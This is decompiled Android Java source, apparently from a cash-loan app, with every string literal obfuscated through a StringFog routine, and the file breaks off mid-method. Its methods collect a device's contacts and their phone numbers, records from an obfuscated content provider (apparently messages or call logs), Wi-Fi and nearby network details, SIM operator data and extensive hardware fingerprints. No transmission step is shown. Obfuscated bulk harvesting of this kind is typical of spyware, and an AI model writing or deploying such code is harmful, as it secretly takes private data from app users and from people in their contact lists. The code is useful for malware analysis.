package com.music.violin.cash.violin.music.loan.store.cash.loan;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import com.getcapacitor.urYzCG;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/* loaded from: classes.dex */
public class QTcw4j1x {

    /* renamed from: C4XY  reason: collision with root package name */
    private final Method f507C4XY;
    private final String QTcw4j1x;
    private final String Sm73oGzmW;

    /* loaded from: classes.dex */
    public static class C4XY {

        /* renamed from: C4XY  reason: collision with root package name */
        private Map<String, Object> f508C4XY = new HashMap();

        public final C4XY C4XY(String str, C4XY c4xy) {
            this.f508C4XY.put(str, c4xy.f508C4XY);
            return this;
        }

        public final C4XY C4XY(String str, Object obj) {
            this.f508C4XY.put(str, obj);
            return this;
        }

        public final Map<String, Object> C4XY() {
            return this.f508C4XY;
        }
    }

    public QTcw4j1x(Method method, urYzCG uryzcg) {
        this.f507C4XY = method;
        this.QTcw4j1x = method.getName();
        this.Sm73oGzmW = uryzcg.C4XY();
    }

    private static C4XY AFXu57tvOA0(Activity activity) {
        C4XY c4xy = new C4XY();
        try {
            WifiInfo connectionInfo = ((WifiManager) activity.getSystemService(StringFog.decrypt("1psixQ==\n", "ofJErGgKNvM=\n"))).getConnectionInfo();
            if (connectionInfo != null) {
                c4xy.C4XY(StringFog.decrypt("GyravMJPeBwJIMiw5Q==\n", "bEO81YEgFnI=\n"), Boolean.TRUE);
                c4xy.C4XY(StringFog.decrypt("ad7qH6s=\n", "C62Zds/bcWQ=\n"), connectionInfo.getBSSID());
                c4xy.C4XY(StringFog.decrypt("Wh/bzQ==\n", "KWyyqexCfh4=\n"), connectionInfo.getSSID());
                c4xy.C4XY(StringFog.decrypt("51KH\n", "ijPkBmCb5Iw=\n"), connectionInfo.getMacAddress());
                String decrypt = StringFog.decrypt("K2I=\n", "QhIaJlRcOnY=\n");
                long ipAddress = connectionInfo.getIpAddress();
                StringBuffer stringBuffer = new StringBuffer();
                stringBuffer.append(ipAddress & 255);
                stringBuffer.append(StringFog.decrypt("xw==\n", "6XrVpk/HxeY=\n"));
                stringBuffer.append((ipAddress >> 8) & 255);
                stringBuffer.append(StringFog.decrypt("Jg==\n", "CPQ7ANds4RE=\n"));
                stringBuffer.append((ipAddress >> 16) & 255);
                stringBuffer.append(StringFog.decrypt("Og==\n", "FESu4vAGgRs=\n"));
                stringBuffer.append((ipAddress >> 24) & 255);
                c4xy.C4XY(decrypt, stringBuffer.toString());
            }
        } catch (Exception unused) {
        }
        return c4xy;
    }

    public static List<Map> C4XY(Activity activity) {
        int i;
        Cursor query;
        ArrayList arrayList = new ArrayList();
        try {
            i = 1;
            query = activity.getContentResolver().query(Uri.parse(StringFog.decrypt("pQnFgt+oOojpSdibyek=\n", "xmar9rrGTrI=\n")), new String[]{StringFog.decrypt("7aGG\n", "ssjiGSK20zQ=\n"), StringFog.decrypt("jOB0GnQlLw==\n", "7YQQaBFWXCY=\n"), StringFog.decrypt("A7PvGHt6\n", "c9adaxQUAMU=\n"), StringFog.decrypt("Kppv4g==\n", "SPULm8dSRRU=\n"), StringFog.decrypt("suUxew==\n", "1oRFHjLAiwI=\n"), StringFog.decrypt("2XpVygNtJcHJ\n", "rRInr2IJeqg=\n"), StringFog.decrypt("U8/mzw==\n", "J7aWqswfGHY=\n"), StringFog.decrypt("nMVfy7ERkS0=\n", "7Lcwv95y/kE=\n"), StringFog.decrypt("yxRtSQ==\n", "uXEMLfvzx+s=\n"), StringFog.decrypt("W5OHi2S7\n", "KOfm/xHINsQ=\n"), StringFog.decrypt("k6TYumKAcPiDpMS4bpE=\n", "4MGqzAvjFac=\n")}, null, null, StringFog.decrypt("DjUK2wmUQ44JdBLXRJlS3VlkTo4=\n", "alR+vinwJv0=\n"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (query == null) {
            Log.i(StringFog.decrypt("Duvc\n", "YYS/kOv8/0s=\n"), StringFog.decrypt("alzujDJ3DuFqXO6MeyhW631L5MhtMUg=\n", "QHbEphhdJMs=\n"));
            return null;
        }
        while (query.moveToNext()) {
            String string = query.getString(query.getColumnIndex(StringFog.decrypt("8iLT\n", "rUu39FwybbU=\n")));
            String string2 = query.getString(query.getColumnIndex(StringFog.decrypt("JPofriX99Ag0\n", "UJJty0SZq2E=\n")));
            String string3 = query.getString(query.getColumnIndex(StringFog.decrypt("bQQggZIV2Q==\n", "DGBE8/dmqiw=\n")));
            String string4 = query.getString(query.getColumnIndex(StringFog.decrypt("TxdDPyQp\n", "P3IxTEtHr0w=\n")));
            String string5 = query.getString(query.getColumnIndex(StringFog.decrypt("K/QXSWr6byI=\n", "W4Z4PQWZAE4=\n")));
            String string6 = query.getString(query.getColumnIndex(StringFog.decrypt("bDxm+A==\n", "HlkHnPpYE6Y=\n")));
            String string7 = query.getString(query.getColumnIndex(StringFog.decrypt("MMH/Gg==\n", "RLiPf76vrnQ=\n")));
            String string8 = query.getString(query.getColumnIndex(StringFog.decrypt("hd2ydQ==\n", "57LWDB65qS8=\n")));
            String string9 = query.getString(query.getColumnIndex(StringFog.decrypt("sq+3wskM\n", "wdvWtrx/g2w=\n")));
            String string10 = query.getString(query.getColumnIndex(StringFog.decrypt("Z19NAw==\n", "Az45ZrWpL5A=\n")));
            String string11 = query.getString(query.getColumnIndex(StringFog.decrypt("M/lEGdA984Ej+Vgb3Cw=\n", "QJw2b7lelt4=\n")));
            HashMap hashMap = new HashMap();
            Uri withAppendedPath = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, string3);
            ContentResolver contentResolver = activity.getContentResolver();
            String[] strArr = new String[i];
            Cursor cursor = query;
            strArr[0] = StringFog.decrypt("bFFK6LOYe7pmWVT9\n", "CDg5mN/5AuU=\n");
            Cursor query2 = contentResolver.query(withAppendedPath, strArr, null, null, null);
            String string12 = query2.moveToFirst() ? query2.getString(query2.getColumnIndex(StringFog.decrypt("oodMjfq10YCoj1KY\n", "xu4//ZbUqN8=\n"))) : null;
            if (query2 != null && !query2.isClosed()) {
                query2.close();
            }
            hashMap.put(StringFog.decrypt("ZaJQoV1Q6uV4og==\n", "Fcci0jI+pIQ=\n"), string12);
            hashMap.put(StringFog.decrypt("gTXBZUE=\n", "7EamKy7N000=\n"), string);
            hashMap.put(StringFog.decrypt("tnyaVAYSVvY=\n", "whToMWd2GJk=\n"), string2);
            hashMap.put(StringFog.decrypt("VXBmDx9h/A==\n", "NBQCfXoSj6k=\n"), string3);
            hashMap.put(StringFog.decrypt("UZbTbMIS\n", "IfOhH618Vso=\n"), string4);
            hashMap.put(StringFog.decrypt("hTo7qSmcsYY=\n", "9UhU3Ub/3uo=\n"), string5);
            hashMap.put(StringFog.decrypt("91jb0g==\n", "hT26thPFihI=\n"), string6);
            hashMap.put(StringFog.decrypt("2qmPGw==\n", "rtD/fqKQKvk=\n"), string7);
            hashMap.put(StringFog.decrypt("Ychldg==\n", "A6cBDz5rc0s=\n"), string8);
            hashMap.put(StringFog.decrypt("HId2sxEM\n", "b/MXx2R/xfQ=\n"), string9);
            hashMap.put(StringFog.decrypt("gag6Pw==\n", "5clOWq0Zqh4=\n"), string10);
            hashMap.put(StringFog.decrypt("rEjgEjx7o6e6Q+YBJw==\n", "3y2SZFUYxuQ=\n"), string11);
            arrayList.add(hashMap);
            query = cursor;
            i = 1;
        }
        Cursor cursor2 = query;
        if (cursor2 != null && !cursor2.isClosed()) {
            cursor2.close();
        }
        return arrayList;
    }

    private static List C4XY(List list) {
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < list.size(); i++) {
            if (!arrayList.contains(list.get(i))) {
                arrayList.add(list.get(i));
            }
        }
        return arrayList;
    }

    /* JADX WARN: Removed duplicated region for block: B:18:0x0053 A[Catch: Exception -> 0x009a, TryCatch #0 {Exception -> 0x009a, blocks: (B:3:0x0005, B:6:0x001a, B:8:0x0020, B:15:0x0042, B:21:0x005a, B:27:0x0073, B:34:0x008d, B:30:0x0085, B:24:0x006c, B:18:0x0053, B:12:0x003b), top: B:38:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:24:0x006c A[Catch: Exception -> 0x009a, TryCatch #0 {Exception -> 0x009a, blocks: (B:3:0x0005, B:6:0x001a, B:8:0x0020, B:15:0x0042, B:21:0x005a, B:27:0x0073, B:34:0x008d, B:30:0x0085, B:24:0x006c, B:18:0x0053, B:12:0x003b), top: B:38:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0084 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0085 A[Catch: Exception -> 0x009a, TryCatch #0 {Exception -> 0x009a, blocks: (B:3:0x0005, B:6:0x001a, B:8:0x0020, B:15:0x0042, B:21:0x005a, B:27:0x0073, B:34:0x008d, B:30:0x0085, B:24:0x006c, B:18:0x0053, B:12:0x003b), top: B:38:0x0005 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    private static java.util.List<java.util.Map> Cyxd6DRPreJUiX(android.app.Activity r8) {
        /*
            java.util.ArrayList r0 = new java.util.ArrayList
            r0.<init>()
            java.lang.String r1 = "CLWrRA==\n"
            java.lang.String r2 = "f9zNLcFS8Mo=\n"
            java.lang.String r1 = com.music.violin.cash.violin.music.loan.store.cash.loan.StringFog.decrypt(r1, r2)     // Catch: java.lang.Exception -> L9a
            java.lang.Object r8 = r8.getSystemService(r1)     // Catch: java.lang.Exception -> L9a
            android.net.wifi.WifiManager r8 = (android.net.wifi.WifiManager) r8     // Catch: java.lang.Exception -> L9a
            java.util.List r8 = r8.getScanResults()     // Catch: java.lang.Exception -> L9a
            if (r8 == 0) goto L9a
            r1 = 0
        L1a:
            int r2 = r8.size()     // Catch: java.lang.Exception -> L9a
            if (r1 >= r2) goto L9a
            java.lang.Object r2 = r8.get(r1)     // Catch: java.lang.Exception -> L9a
            android.net.wifi.ScanResult r2 = (android.net.wifi.ScanResult) r2     // Catch: java.lang.Exception -> L9a
            com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x$C4XY r3 = new com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x$C4XY     // Catch: java.lang.Exception -> L9a
            r3.<init>()     // Catch: java.lang.Exception -> L9a
            java.lang.String r4 = "8U7L/A==\n"
            java.lang.String r5 = "gj2imHZ2g84=\n"
            java.lang.String r4 = com.music.violin.cash.violin.music.loan.store.cash.loan.StringFog.decrypt(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r5 = r2.SSID     // Catch: java.lang.Exception -> L9a
            java.lang.String r6 = ""
            if (r5 != 0) goto L3b
        L39:
            r5 = r6
            goto L42
        L3b:
            boolean r7 = android.text.TextUtils.isEmpty(r5)     // Catch: java.lang.Exception -> L9a
            if (r7 == 0) goto L42
            goto L39
        L42:
            r3.C4XY(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r4 = "LseJm6s=\n"
            java.lang.String r5 = "TLT68s/fgR0=\n"
            java.lang.String r4 = com.music.violin.cash.violin.music.loan.store.cash.loan.StringFog.decrypt(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r5 = r2.BSSID     // Catch: java.lang.Exception -> L9a
            if (r5 != 0) goto L53
        L51:
            r5 = r6
            goto L5a
        L53:
            boolean r7 = android.text.TextUtils.isEmpty(r5)     // Catch: java.lang.Exception -> L9a
            if (r7 == 0) goto L5a
            goto L51
        L5a:
            r3.C4XY(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r4 = "vY+ihQ==\n"
            java.lang.String r5 = "0+7P4MEUA14=\n"
            java.lang.String r4 = com.music.violin.cash.violin.music.loan.store.cash.loan.StringFog.decrypt(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r5 = r2.SSID     // Catch: java.lang.Exception -> L9a
            if (r5 != 0) goto L6c
        L6a:
            r5 = r6
            goto L73
        L6c:
            boolean r7 = android.text.TextUtils.isEmpty(r5)     // Catch: java.lang.Exception -> L9a
            if (r7 == 0) goto L73
            goto L6a
        L73:
            r3.C4XY(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r4 = "wMUZ\n"
            java.lang.String r5 = "raR6rsbzORk=\n"
            java.lang.String r4 = com.music.violin.cash.violin.music.loan.store.cash.loan.StringFog.decrypt(r4, r5)     // Catch: java.lang.Exception -> L9a
            java.lang.String r2 = r2.BSSID     // Catch: java.lang.Exception -> L9a
            if (r2 != 0) goto L85
            goto L8d
        L85:
            boolean r5 = android.text.TextUtils.isEmpty(r2)     // Catch: java.lang.Exception -> L9a
            if (r5 == 0) goto L8c
            goto L8d
        L8c:
            r6 = r2
        L8d:
            r3.C4XY(r4, r6)     // Catch: java.lang.Exception -> L9a
            java.util.Map r2 = r3.C4XY()     // Catch: java.lang.Exception -> L9a
            r0.add(r2)     // Catch: java.lang.Exception -> L9a
            int r1 = r1 + 1
            goto L1a
        L9a:
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x.Cyxd6DRPreJUiX(android.app.Activity):java.util.List");
    }

    private static C4XY N4B1AfRo(Activity activity) {
        TelephonyManager telephonyManager;
        C4XY c4xy = new C4XY();
        c4xy.C4XY(StringFog.decrypt("5oL7U5P+yvb2gg==\n", "he2OPeeMs78=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.wXOhEqY(activity));
        String decrypt = StringFog.decrypt("+O+Ci7FZwvHm6JWQ\n", "i4rw4tA1jIQ=\n");
        String Sm73oGzmW = com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Sm73oGzmW();
        if (Sm73oGzmW == null || TextUtils.isEmpty(Sm73oGzmW)) {
            Sm73oGzmW = "";
        }
        c4xy.C4XY(decrypt, Sm73oGzmW);
        c4xy.C4XY(StringFog.decrypt("yGUtb/NP+djebSRV\n", "uwxALJI9nYo=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.RkflxGI2By7Sz(activity));
        c4xy.C4XY(StringFog.decrypt("9IHTptMcuxntjw==\n", "me6xz795/3g=\n"), Boolean.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.b6HMc6th(activity)));
        c4xy.C4XY(StringFog.decrypt("3YnhW500MKrWmv5uqiEh\n", "ueiVOtNRRN0=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.AFXu57tvOA0(activity));
        try {
            telephonyManager = (TelephonyManager) activity.getSystemService(StringFog.decrypt("YvtX0nI=\n", "EpM4vBc0gz4=\n"));
            c4xy.C4XY(StringFog.decrypt("U0WYBGsD6O4=\n", "PDX9dgp3h5w=\n"), telephonyManager.getSimOperator());
            c4xy.C4XY(StringFog.decrypt("3OJngcax/Cj982+W\n", "s5IC86fFk1o=\n"), telephonyManager.getSimOperatorName());
        } catch (Exception unused) {
        }
        if (Build.VERSION.SDK_INT < 26 || ActivityCompat.checkSelfPermission(activity, StringFog.decrypt("A092oFfQFOUSRGC/UcoDog1PPIB9+DSUMmldnH3mI58jdVc=\n", "YiES0ji5cMs=\n")) != 0) {
            return c4xy;
        }
        c4xy.C4XY(StringFog.decrypt("+NE0jDRtdsDh3xOLOWpexPE=\n", "lb5W5VgIMqE=\n"), Boolean.valueOf(telephonyManager.isDataEnabled()));
        return c4xy;
    }

    /* JADX WARN: Removed duplicated region for block: B:20:0x01e0  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x01e5 A[RETURN] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static java.util.List<java.util.Map<java.lang.String, java.lang.Object>> QTcw4j1x(android.app.Activity r10) {
        /*
            Method dump skipped, instructions count: 486
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x.QTcw4j1x(android.app.Activity):java.util.List");
    }

    private static C4XY RkflxGI2By7Sz(Activity activity) {
        C4XY c4xy = new C4XY();
        c4xy.C4XY(StringFog.decrypt("6BKp3SGRy8PhEg==\n", "jHfftEL0haI=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.lm()).C4XY(StringFog.decrypt("aSFL/DY=\n", "C1MqklKh2U4=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.ggFJmuhehlz2k1()).C4XY(StringFog.decrypt("Yi5sXvoAnQ==\n", "ElwDOo9j6fM=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.snRLW7bVlwmEpJ()).C4XY(StringFog.decrypt("H9+l8OU=\n", "crDBlYk/2MA=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.urYzCG()).C4XY(StringFog.decrypt("4wwfeQq6cw==\n", "kWlzHGvJFsY=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.X3OKRI()).C4XY(StringFog.decrypt("CbkWnTmNPQ==\n", "asljyUD9WIM=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.C4XY()).C4XY(StringFog.decrypt("Ps9sasWJADoixQ==\n", "TasHPKD7c1M=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Tk3BGC4()).C4XY(StringFog.decrypt("e3BYBkwoqz1ld08d\n", "CBUqby1E5Ug=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Sm73oGzmW()).C4XY(StringFog.decrypt("L/1M0gjM+pMM/E/E\n", "X5U1oWGvm/8=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.QTcw4j1x(activity));
        try {
            C4XY C4XY2 = c4xy.C4XY(StringFog.decrypt("STy5m3Hi1t5RL7Kc\n", "JF3X7heDtao=\n"), Build.MANUFACTURER).C4XY(StringFog.decrypt("O7x5jeDTUw==\n", "X9UK/YyyKu0=\n"), Build.DISPLAY).C4XY(StringFog.decrypt("AgHF+frf7S0NBt8=\n", "ZGirnp+tnV8=\n"), Build.FINGERPRINT);
            String decrypt = StringFog.decrypt("IKF84Q==\n", "QcMVkqaNoTQ=\n");
            ArrayList arrayList = new ArrayList();
            if (Build.SUPPORTED_ABIS != null) {
                for (String str : Build.SUPPORTED_ABIS) {
                    arrayList.add(str);
                }
            }
            C4XY2.C4XY(decrypt, arrayList).C4XY(StringFog.decrypt("HbT4NJc=\n", "f9uZRvPvrUg=\n"), Build.BOARD).C4XY(StringFog.decrypt("aZ0KIFpsqQ==\n", "C+hjTD4lzd8=\n"), Build.ID).C4XY(StringFog.decrypt("YToI2g==\n", "CVV7rv7oPQE=\n"), Build.HOST).C4XY(StringFog.decrypt("mmAmkw==\n", "7hlW9kDkGlA=\n"), Build.TYPE).C4XY(StringFog.decrypt("ZVeC36FjARd1\n", "ByLrs8U2cnI=\n"), Build.USER).C4XY(StringFog.decrypt("y5JMaN1x\n", "qOI5Kb8Y4NQ=\n"), Build.CPU_ABI).C4XY(StringFog.decrypt("gO26evSgzA==\n", "453PO5bJ/hU=\n"), Build.CPU_ABI2).C4XY(StringFog.decrypt("gwTE8dQhxTKEGQ==\n", "4WurhbhOpFY=\n"), Build.BOOTLOADER).C4XY(StringFog.decrypt("P31P0p4yTPs=\n", "Vxw9tulTPp4=\n"), Build.HARDWARE).C4XY(StringFog.decrypt("h4egxHLA\n", "5ebToT2T+jc=\n"), Build.VERSION.BASE_OS);
        } catch (Exception unused) {
        }
        c4xy.C4XY(StringFog.decrypt("CfwjnftpTroI9Cia\n", "e51H9JQ/K8g=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.N4B1AfRo());
        try {
            c4xy.C4XY(StringFog.decrypt("IQzuVwxFs8wmAA==\n", "UmitNn4h460=\n"), Environment.getExternalStorageDirectory().toString());
        } catch (Exception unused2) {
        }
        c4xy.C4XY(StringFog.decrypt("M6jotwJtNHkOqeizHFA8bz8=\n", "Wsac0nADVRU=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.wXOhEqY())).C4XY(StringFog.decrypt("jzmrv0OBAuenIb6zXY4B54MEtqBU\n", "5lff2jHvY4s=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Cyxd6DRPreJUiX())).C4XY(StringFog.decrypt("9LsWALgRcNjFrBYEpix4zvQ=\n", "kcNiZcp/EbQ=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.AFXu57tvOA0())).C4XY(StringFog.decrypt("ruA0X6wVr5CK7iFTshqskK7LKUC7\n", "y5hAOt57zvw=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.RkflxGI2By7Sz())).C4XY(StringFog.decrypt("UFnd9sqsj8NFUg==\n", "Iz2el7jIxq0=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.NQtKsO());
        return c4xy;
    }

    public static List<Map> Sm73oGzmW(Activity activity) {
        ArrayList arrayList = new ArrayList();
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            ContentResolver contentResolver = activity.getContentResolver();
            Cursor query = contentResolver.query(uri, null, null, null, null);
            while (query != null && query.moveToNext()) {
                HashMap hashMap = new HashMap();
                String string = query.getString(query.getColumnIndex(StringFog.decrypt("7bxW\n", "stUyG7sFtSQ=\n")));
                hashMap.put(StringFog.decrypt("8DBv\n", "r1kLRTyHXEs=\n"), string);
                String string2 = query.getString(query.getColumnIndex(StringFog.decrypt("OI+bzmeZYd4ylI/OZ5pb\n", "W/rougj0Pqw=\n")));
                Integer valueOf = Integer.valueOf(query.getInt(query.getColumnIndex(StringFog.decrypt("vixvSA4oD1y3En9TPygHUqYoeA==\n", "0k0cPFFcZjE=\n"))));
                Integer valueOf2 = Integer.valueOf(query.getInt(query.getColumnIndex(StringFog.decrypt("bKk5hJmm+AZpoz6Do7/2MHM=\n", "H8xX4MbSl1k=\n"))));
                String string3 = query.getString(query.getColumnIndex(StringFog.decrypt("iy756Zl7WQ==\n", "+FqYm+sePbo=\n")));
                Integer valueOf3 = Integer.valueOf(query.getInt(query.getColumnIndex(StringFog.decrypt("e4m748vO5TlhlLflzPTi\n", "D+DWhriRhlY=\n"))));
                Integer valueOf4 = Integer.valueOf(query.getInt(query.getColumnIndex(StringFog.decrypt("+CjoxIJtl9/1FvXun2edww==\n", "kEmbm/IF+LE=\n"))));
                Integer valueOf5 = Integer.valueOf(query.getInt(query.getColumnIndex(StringFog.decrypt("1RdNTkY4cpLQHE1fXSRugA==\n", "vHkSOC9LG/A=\n"))));
                String string4 = query.getString(query.getColumnIndex(StringFog.decrypt("fW6GqVjkzjVkb7a6Qu3Z\n", "FB3Z3CuBvGo=\n")));
                query.getString(query.getColumnIndex(StringFog.decrypt("OPcOdkvC1xM=\n", "SJ9hAiSdvnc=\n")));
                String string5 = query.getString(query.getColumnIndex(StringFog.decrypt("4Ymhx8F5aYbxkq7H1Wk=\n", "gubPs6AaHdk=\n")));
                Long valueOf6 = Long.valueOf(query.getLong(query.getColumnIndex(StringFog.decrypt("4ScCQQR7NJbxPA1BEGsfvfE=\n", "gkhsNWUYQMk=\n"))));
                String string6 = query.getString(query.getColumnIndex(StringFog.decrypt("gqPRBDFEkBSIq88R\n", "5sqidF0l6Us=\n")));
                Long valueOf7 = Long.valueOf(query.getLong(query.getColumnIndex(StringFog.decrypt("LTokprcd7GQiNDmmiQvoXy8hL7aJCvFWKyY+s7sO\n", "TlVK0tZ+mDs=\n"))));
                StringBuffer stringBuffer = new StringBuffer();
                Uri uri2 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                StringBuffer stringBuffer2 = stringBuffer;
                ContentResolver contentResolver2 = contentResolver;
                Cursor query2 = contentResolver.query(uri2, null, StringFog.decrypt("GDgskhG4BrcSM2LbUA==\n", "e1dC5nDbcug=\n") + string, null, null);
                ArrayList arrayList2 = new ArrayList();
                while (query2 != null && query2.moveToNext()) {
                    arrayList2.add(query2.getString(query2.getColumnIndex(StringFog.decrypt("4dVUZXo=\n", "hbQgBEu8p6o=\n"))));
                }
                if (arrayList2.size() > 0) {
                    List C4XY2 = C4XY(arrayList2);
                    int i = 0;
                    while (i < C4XY2.size()) {
                        StringBuffer stringBuffer3 = stringBuffer2;
                        stringBuffer3.append((String) C4XY2.get(i));
                        stringBuffer3.append(StringFog.decrypt("rg==\n", "gj4pLrr7FXU=\n"));
                        i++;
                        stringBuffer2 = stringBuffer3;
                    }
                }
                StringBuffer stringBuffer4 = stringBuffer2;
                String stringBuffer5 = stringBuffer4.toString();
                if (stringBuffer5.indexOf(StringFog.decrypt("1g==\n", "+pBAt9tobFY=\n")) != -1) {
                    stringBuffer5 = stringBuffer4.deleteCharAt(stringBuffer4.length() - 1).toString();
                }
                query2.close();
                String decrypt = StringFog.decrypt("2aznc0+z\n", "t9mKESrB18c=\n");
                if (stringBuffer5 != null) {
                    if (TextUtils.isEmpty(stringBuffer5)) {
                    }
                    hashMap.put(decrypt, stringBuffer5);
                    hashMap.put(StringFog.decrypt("BtJDF/q+3moexw==\n", "c6Indo7bigM=\n"), valueOf7);
                    String decrypt2 = StringFog.decrypt("oTtOGrIz9t6sKUkBszs=\n", "wk49bt1epLc=\n");
                    if (string2 != null && !TextUtils.isEmpty(string2)) {
                        hashMap.put(decrypt2, string2);
                        hashMap.put(StringFog.decrypt("WNAe9c4ObP133gP1+wR1/VA=\n", "NLFtgZpnAZg=\n"), valueOf);
                        hashMap.put(StringFog.decrypt("Ljyili2BlRI0OqmfGIev\n", "XVnM8nnuw30=\n"), valueOf2);
                        hashMap.put(StringFog.decrypt("envIZJakWQ==\n", "CQ+pFuTBPRk=\n"), string3);
                        hashMap.put(StringFog.decrypt("zVWIJcSG57DNXYY00qE=\n", "uTzlQLfFiN4=\n"), valueOf3);
                        hashMap.put(StringFog.decrypt("cEQ68nMfqqRWUCTAfgI=\n", "GCVJohtwxME=\n"), valueOf4);
                        hashMap.put(StringFog.decrypt("3pfmGqUQ9HHSvsIcowk=\n", "t/mwc9Z5lh0=\n"), valueOf5);
                        hashMap.put(StringFog.decrypt("E/41jrc6wg==\n", "Y4xa6N5Wp6U=\n"), string4);
                        hashMap.put(StringFog.decrypt("lP0vLo1ycISD8zUvnw==\n", "95JBWuwRBNc=\n"), string5);
                        hashMap.put(StringFog.decrypt("2jczkPGvBFbNOSmR45gD\n", "uVhd5JDMcAU=\n"), valueOf6);
                        hashMap.put(StringFog.decrypt("DB5I4Q==\n", "Yn8lhPBiVLU=\n"), string6);
                        arrayList.add(hashMap);
                        contentResolver = contentResolver2;
                    }
                    string2 = "";
                    hashMap.put(decrypt2, string2);
                    hashMap.put(StringFog.decrypt("WNAe9c4ObP133gP1+wR1/VA=\n", "NLFtgZpnAZg=\n"), valueOf);
                    hashMap.put(StringFog.decrypt("Ljyili2BlRI0OqmfGIev\n", "XVnM8nnuw30=\n"), valueOf2);
                    hashMap.put(StringFog.decrypt("envIZJakWQ==\n", "CQ+pFuTBPRk=\n"), string3);
                    hashMap.put(StringFog.decrypt("zVWIJcSG57DNXYY00qE=\n", "uTzlQLfFiN4=\n"), valueOf3);
                    hashMap.put(StringFog.decrypt("cEQ68nMfqqRWUCTAfgI=\n", "GCVJohtwxME=\n"), valueOf4);
                    hashMap.put(StringFog.decrypt("3pfmGqUQ9HHSvsIcowk=\n", "t/mwc9Z5lh0=\n"), valueOf5);
                    hashMap.put(StringFog.decrypt("E/41jrc6wg==\n", "Y4xa6N5Wp6U=\n"), string4);
                    hashMap.put(StringFog.decrypt("lP0vLo1ycISD8zUvnw==\n", "95JBWuwRBNc=\n"), string5);
                    hashMap.put(StringFog.decrypt("2jczkPGvBFbNOSmR45gD\n", "uVhd5JDMcAU=\n"), valueOf6);
                    hashMap.put(StringFog.decrypt("DB5I4Q==\n", "Yn8lhPBiVLU=\n"), string6);
                    arrayList.add(hashMap);
                    contentResolver = contentResolver2;
                }
                stringBuffer5 = "";
                hashMap.put(decrypt, stringBuffer5);
                hashMap.put(StringFog.decrypt("BtJDF/q+3moexw==\n", "c6Indo7bigM=\n"), valueOf7);
                String decrypt22 = StringFog.decrypt("oTtOGrIz9t6sKUkBszs=\n", "wk49bt1epLc=\n");
                if (string2 != null) {
                    hashMap.put(decrypt22, string2);
                    hashMap.put(StringFog.decrypt("WNAe9c4ObP133gP1+wR1/VA=\n", "NLFtgZpnAZg=\n"), valueOf);
                    hashMap.put(StringFog.decrypt("Ljyili2BlRI0OqmfGIev\n", "XVnM8nnuw30=\n"), valueOf2);
                    hashMap.put(StringFog.decrypt("envIZJakWQ==\n", "CQ+pFuTBPRk=\n"), string3);
                    hashMap.put(StringFog.decrypt("zVWIJcSG57DNXYY00qE=\n", "uTzlQLfFiN4=\n"), valueOf3);
                    hashMap.put(StringFog.decrypt("cEQ68nMfqqRWUCTAfgI=\n", "GCVJohtwxME=\n"), valueOf4);
